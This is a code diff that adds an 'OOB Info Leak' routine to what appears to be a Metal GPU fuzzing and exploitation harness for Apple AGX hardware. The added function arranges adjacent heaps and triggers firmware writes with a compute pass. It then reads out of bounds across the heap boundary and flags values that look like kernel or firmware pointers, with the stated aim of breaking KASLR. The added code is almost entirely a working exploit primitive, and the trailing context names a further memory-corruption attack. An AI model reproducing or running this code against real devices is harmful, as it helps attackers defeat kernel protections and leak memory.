@@ -671,6 +671,96 @@ func runICBCorruptFuzz(log: FuzzLog, completion: @escaping () -> Void) {
     }
 }
 
+// OOB Info Leak — cross-heap OOB READ to scan h1's GPU-visible shared memory for
+// kernel/firmware pointers written by AGX firmware during command execution.
+// Texture at h1[4096] + a completed compute pass causes the firmware to write
+// command-tracking metadata into h1's shared region. We then OOB-read the entire
+// h1 window looking for pointer-shaped values that break KASLR or reveal GPU VA layout.
+func runOOBInfoLeak(log: FuzzLog, completion: @escaping () -> Void) {
+    DispatchQueue.global(qos: .userInitiated).async {
+        let sl = SyncLog()
+        func step(_ s: String) { sl.write(s); log.append(s) }
+
+        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ no device"); completion(); return }
+        guard let queue  = device.makeCommandQueue() else { step("✗ no queue"); completion(); return }
+        step("── OOB Info Leak ─────────────────────────")
+
+        // h0 (OOB src) + h1 (victim — read target)
+        let hd = MTLHeapDescriptor(); hd.size = 4096; hd.storageMode = .shared
+        guard let h0 = device.makeHeap(descriptor: hd),
+              let h1 = device.makeHeap(descriptor: hd) else { step("heap nil"); completion(); return }
+        let actual = h0.size  // 16384 bytes
+
+        guard let b0 = h0.makeBuffer(length: actual, options: .storageModeShared) else { step("b0 nil"); completion(); return }
+        let p0 = b0.contents().assumingMemoryBound(to: UInt8.self)
+        let va0 = UInt(bitPattern: p0)
+
+        // probe1 occupies h1[0..4095]
+        guard let probe1 = h1.makeBuffer(length: 64, options: .storageModeShared) else { step("probe1 nil"); completion(); return }
+        let va1 = UInt(bitPattern: probe1.contents())
+        let dist = va1 > va0 ? va1 - va0 : va0 - va1
+        step("va0=0x\(String(va0,radix:16)) va1=0x\(String(va1,radix:16)) dist=0x\(String(dist,radix:16))")
+        guard dist == UInt(actual) else { step("✗ not adjacent"); completion(); return }
+        step("✓ adjacent confirmed")
+
+        // Place 32×32 texture at h1[4096] — AGX firmware writes texture + command metadata here
+        let td = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .rgba8Unorm,
+                                                           width: 32, height: 32, mipmapped: false)
+        td.storageMode = .shared; td.usage = [.shaderRead, .shaderWrite]
+        guard let tex1 = h1.makeTexture(descriptor: td) else { step("tex1 nil"); completion(); return }
+        step("tex1 at h1[4096] — 32×32 rgba8 shared")
+
+        // Submit a compute pass using tex1 to force AGX firmware to write command metadata
+        let src = """
+        #include <metal_stdlib>
+        using namespace metal;
+        kernel void probe(texture2d<float,access::read_write> t [[texture(0)]],
+                          uint2 g [[thread_position_in_grid]]) {
+            float4 v = t.read(g); t.write(v + 0.001, g);
+        }
+        """
+        do {
+            let lib = try device.makeLibrary(source: src, options: MTLCompileOptions())
+            guard let fn = lib.makeFunction(name: "probe") else { step("fn nil"); completion(); return }
+            let pso = try device.makeComputePipelineState(function: fn)
+            guard let cmd = queue.makeCommandBuffer(),
+                  let enc = cmd.makeComputeCommandEncoder() else { step("cmd nil"); completion(); return }
+            enc.setComputePipelineState(pso)
+            enc.setTexture(tex1, index: 0)
+            enc.dispatchThreadgroups(MTLSize(width:1,height:1,depth:1),
+                                     threadsPerThreadgroup: MTLSize(width:8,height:8,depth:1))
+            enc.endEncoding()
+            cmd.commit()
+            cmd.waitUntilCompleted()
+        } catch { step("PSO err: \(error.localizedDescription)"); completion(); return }
+        step("GPU pass completed — scanning h1 for firmware metadata")
+
+        // OOB-read entire h1 window: p0[actual + i] = h1[i] for i in 0..<actual
+        // Classify each non-zero 8-byte qword
+        var found = 0
+        for qw in 0..<(actual / 8) {
+            var val: UInt64 = 0
+            for b in 0..<8 { val |= UInt64(p0[actual + qw*8 + b]) << (b*8) }
+            guard val != 0 && val != 0xFFFFFFFFFFFFFFFF else { continue }
+
+            let isKernelPtr   = val >= 0xFFFFFE0000000000
+            let isUserGPUPtr  = val >= 0x100000000 && val < 0xFFFFFE0000000000
+            let tag: String
+            if isKernelPtr  { tag = " *** KERNEL/FW PTR" }
+            else if isUserGPUPtr { tag = " (user/gpu va)" }
+            else { tag = "" }
+
+            step("  h1[+0x\(String(qw*8,radix:16))] = 0x\(String(val,radix:16))\(tag)")
+            found += 1
+            if found >= 80 { step("  ... truncated (80 entries)"); break }
+        }
+        step(found == 0 ? "  all zero — firmware wrote nothing visible to h1 shared mem"
+                        : "found \(found) non-zero qwords in h1")
+        step("── OOB Info Leak complete ─────────────────")
+        completion()
+    }
+}
+
 // MTLSharedEvent signal-path corruption.
 // MTLSharedEvent is backed by GPU-visible shared memory (signaledValue at known offset).
 // Attack: interleave heap + event allocations so they land adjacent in GPU VA space.
